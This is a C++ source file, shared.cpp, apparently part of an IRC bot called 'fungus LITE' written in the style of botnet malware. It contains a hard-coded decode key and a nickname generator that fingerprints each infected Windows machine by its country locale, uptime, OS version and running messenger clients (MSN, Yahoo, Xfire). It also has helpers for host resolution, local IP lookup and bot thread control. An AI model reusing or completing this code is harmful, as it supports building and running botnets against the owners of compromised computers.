/*
   ___                                           
 /'___\                                          
/\ \__/  __  __    ___      __   __  __    ____  
\ \ ,__\/\ \/\ \ /' _ `\  /'_ `\/\ \/\ \  /',__\  by Zax0mA
 \ \ \_/\ \ \_\ \/\ \/\ \/\ \L\ \ \ \_\ \/\__, `\
  \ \_\  \ \____/\ \_\ \_\ \____ \ \____/\/\____/ LITE
   \/_/   \/___/  \/_/\/_/\/___L\ \/___/  \/___/ 
                            /\____/              
                            \_/__/     
							          
  shared.cpp
  -> some shared functions, including nick and ident shit
*/

#include "includes.h"
#include "externs.h"

/////////////////
// config here //
/////////////////

char decode_key[] = "2jh3iu";

/////////////////
// config ends //
/////////////////
char *nickgen_prefix(char *nick)
{
	static char rndnick[22];
	ZeroMemory(rndnick,22);
	char days[8];
	unsigned int ud=GetTickCount()/86400000;
	sprintf(rndnick,"[");
	char locale[22];
	GetLocaleInfo(LOCALE_SYSTEM_DEFAULT, LOCALE_SABBREVCTRYNAME,locale,sizeof(locale));
	strcat(rndnick,locale);
	strcat(rndnick,"|");
	sprintf(days,"%.2d",ud);
	strcat(rndnick,days);
	strcat(rndnick,"|");

	char *os;
	OSVERSIONINFO osVI;
	osVI.dwOSVersionInfoSize=sizeof(OSVERSIONINFO);
	if (GetVersionEx(&osVI)) {
			if(osVI.dwMajorVersion==4 && osVI.dwMinorVersion==0)
			{	if(osVI.dwPlatformId==VER_PLATFORM_WIN32_WINDOWS)		os="95";
				if(osVI.dwPlatformId==VER_PLATFORM_WIN32_NT)			os="NT"; }
			else if(osVI.dwMajorVersion==4 && osVI.dwMinorVersion==10)	os="98";
			else if(osVI.dwMajorVersion==4 && osVI.dwMinorVersion==90)	os="ME";
			else if(osVI.dwMajorVersion==5 && osVI.dwMinorVersion==0)	os="2K";
			else if(osVI.dwMajorVersion==5 && osVI.dwMinorVersion==1)	os="XP";
			else if(osVI.dwMajorVersion==5 && osVI.dwMinorVersion==2)	os="2K3";
			else if(osVI.dwMajorVersion==6 && osVI.dwMinorVersion==0)   os="VIS";
			else														os="WIN";
			} else
			os="UNK";
	strcat(rndnick,os);
	strcat(rndnick,"|");
	bool x = FALSE;
	if (FindWindow("MSNHiddenWindowClass",0))
	{
        x = TRUE;
		strcat(rndnick,"M");
	}
	if (FindWindow("YahooBuddyMain",0))
	{
     	x = TRUE;
		strcat(rndnick,"Y");
	}
	if (FindWindow("Xfire",0))
	{
        x = TRUE;
		strcat(rndnick,"X");
	}
	if (x == TRUE)
	{
		strcat(rndnick, "|");
	}
	char randomadd[10];
	strcpy(randomadd, GenerateRandomLetters(6));
	strcat(randomadd, "]");
	strcat(rndnick, randomadd);
	strcpy(nick, rndnick);
	return nick;
};



char *GenerateRandomLetters(unsigned int len)
{
	char			*nick;
	unsigned int	i;

	if (len == 0 || len > MAX_RANDOM_LETTERS)
		len = rand()%(MAX_RANDOM_LETTERS-3) + 3;

	nick = (char *) malloc (len + 1);

	for (i = 0; i <= len; i++)
		nick[i] = (rand()%26) + 97;

	nick[len] = 0;

	return nick;
}





unsigned int Resolve(char *host) 
{
    struct	hostent		*hp;
    unsigned int		host_ip;

    host_ip = inet_addr(host);
    if (host_ip == INADDR_NONE) 
	{
        hp = gethostbyname(host);
        if (hp == 0) 
            return 0;
		else 
			host_ip = *(u_int *)(hp->h_addr);
    }

    return host_ip;
}


char *GetMyIP(SOCKET sock) 
{
	static char		ip[16];
	SOCKADDR		sa;
	int				sas = sizeof(sa);

	memset(&sa, 0, sizeof(sa));
	getsockname(sock, &sa, &sas);

	sprintf(ip, "%d.%d.%d.%d", (BYTE)sa.sa_data[2], (BYTE)sa.sa_data[3], (BYTE)sa.sa_data[4], (BYTE)sa.sa_data[5]);

	return (ip);
}




void Thread_Prepare()
{
	int		i;
	
	for (i = 0; i < MAX_THREADS; i++)
	{
		threads[i].tHandle = NULL;
		threads[i].type = NONE;
	}
}


int Thread_Add(thread_type type)
{
	int		i;

	for (i = 0; i < MAX_THREADS; i++)
		if (threads[i].tHandle == NULL)
			break;

	if (i == MAX_THREADS)
		i = -1;
	else
		threads[i].type = type;

#ifdef DEBUG
	printf("Adding thread number: %d\n", i);
#endif

	return i;
}


int Thread_Check(thread_type type)
{
	int		i, 
			k = 0;

	for (i = 0; i < MAX_THREADS; i++)
		if (threads[i].type == type)
			k++;

	return k;
}


void Thread_Clear(int num)
{
	threads[num].tHandle = NULL;
	threads[num].type = NONE;
	closesocket(threads[num].tsock);
}


int Thread_Kill(thread_type type)
{
	int		i,
			k = 0;

	for (i = 0; i < MAX_THREADS; i++)
	{
		if (threads[i].type == type)
		{
			TerminateThread(threads[i].tHandle, 0);
			Thread_Clear(i);
			k++;
		}
	}

	return k;
}


HANDLE Thread_Start(LPTHREAD_START_ROUTINE function, LPVOID param, BOOL wait)
{
	DWORD		id = 0;
	HANDLE		tHandle;

	tHandle = CreateThread(NULL, 0, function, (LPVOID)param, 0, &id);

	if (wait)
	{
		WaitForSingleObject(tHandle, INFINITE);
		CloseHandle(tHandle);
	}
	else
		Sleep(THREAD_WAIT_TIME);

	return tHandle;
}


